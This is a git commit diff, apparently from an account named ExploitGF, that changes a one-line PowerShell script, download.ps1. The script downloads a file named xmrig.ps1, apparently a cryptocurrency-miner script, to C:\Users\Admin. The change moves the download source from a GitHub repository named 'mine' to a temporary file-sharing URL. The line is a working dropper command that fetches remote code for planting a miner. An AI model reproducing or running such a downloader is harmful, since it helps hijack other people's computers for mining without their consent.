340ca9102b1ff95e7905272702a8c666ad0e6f73
ExploitGF <32704607+ExploitGF@users.noreply.github.com>
2018-08-28 16:35:24 +0500

    Update download.ps1

--- download.ps1
+++ download.ps1
@@ -1,1 +1,1 @@
-(New-Object System.Net.WebClient).DownloadFile("https://github.com/ExploitGF/mine/blob/master/xmrig.ps1","C:\Users\Admin\xmrig.ps1")
+(New-Object System.Net.WebClient).DownloadFile("https://expirebox.com/files/1e9eeaaa9b706594d0ad3d2833c44602.ps1","C:\Users\Admin\xmrig.ps1")
